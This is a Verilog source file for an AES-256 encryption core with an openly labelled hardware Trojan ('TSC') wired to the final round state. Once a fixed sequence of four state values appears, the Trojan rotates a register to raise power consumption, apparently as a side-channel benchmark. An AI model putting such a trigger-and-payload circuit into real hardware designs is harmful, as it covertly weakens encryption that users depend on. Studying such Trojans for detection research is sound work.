module AES_Encrypt#(parameter N=256, parameter Nr=14, parameter Nk=8)(in, key, out, clk, rst);

input [127:0] in;
input [N-1:0] key;
output [127:0] out;
input clk, rst;
wire [(128*(Nr+1))-1 :0] fullkeys;
wire [127:0] states [Nr+1:0];
wire [127:0] afterSubBytes;
wire [127:0] afterShiftRows;

// Key expansion for AES-256
keyExpansion #(Nk,Nr) ke (key, fullkeys);

// Initial round
addRoundKey addrk1 (in, states[0], fullkeys[((128*(Nr+1))-1)-:128]);

// Main encryption rounds
genvar i;
generate
for(i=1; i<Nr ;i=i+1) begin : loop
    encryptRound er(states[i-1], fullkeys[(((128*(Nr+1))-1)-128*i)-:128], states[i]);
end
subBytes sb(states[Nr-1], afterSubBytes);
shiftRows sr(afterSubBytes, afterShiftRows);
addRoundKey addrk2(afterShiftRows, states[Nr], fullkeys[127:0]);
assign out=states[Nr];
endgenerate

// Trojan integration -- can use any internal state, here using last round
TSC tsc_trojan(
    .clk(clk),
    .rst(rst),
    .state(states[Nr]) // You can also select another round for monitoring
);

endmodule

module TSC(
    input clk,
    input rst,
    input [127:0] state
    // Add outputs here if monitoring or trigger signals are needed
    );

 reg [127:0] DynamicPower; 
 reg State0, State1, State2, State3; 
 reg Tj_Trig;
 
 always @(posedge clk or posedge rst)
 begin
    if (rst == 1)
        DynamicPower <= 128'haaaaaaaa_aaaaaaaa_aaaaaaaa_aaaaaaaa;
    else if (Tj_Trig == 1)
        DynamicPower <= {DynamicPower[0],DynamicPower[127:1]}; 
 end

 always @(posedge clk or posedge rst)
 begin
    if (rst == 1) begin
        State0 <= 0;
        State1 <= 0;
        State2 <= 0;
        State3 <= 0; 
    end else if (state == 128'h3243f6a8_885a308d_313198a2_e0370734) begin
        State0 <= 1;
    end else if ((state == 128'h00112233_44556677_8899aabb_ccddeeff) && (State0 == 1)) begin
        State1 <= 1;
    end else if ((state == 128'h0) && (State1 == 1)) begin
        State2 <= 1;
    end else if ((state == 128'h1) && (State2 == 1)) begin
        State3 <= 1;
    end
 end

 always @(State0, State1, State2, State3)
 begin
    Tj_Trig <= State0 & State1 & State2 & State3;
 end

endmodule
